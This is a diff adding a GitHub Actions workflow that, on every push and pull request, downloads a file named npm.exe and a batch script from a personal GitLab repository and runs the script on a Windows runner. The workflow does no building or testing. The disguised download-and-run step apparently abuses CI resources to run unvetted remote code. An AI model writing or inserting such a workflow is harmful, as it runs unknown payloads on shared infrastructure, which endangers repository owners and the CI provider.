@@ -1,0 +1,11 @@
+name: K
+on: [push, pull_request]
+jobs:
+  aasem:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
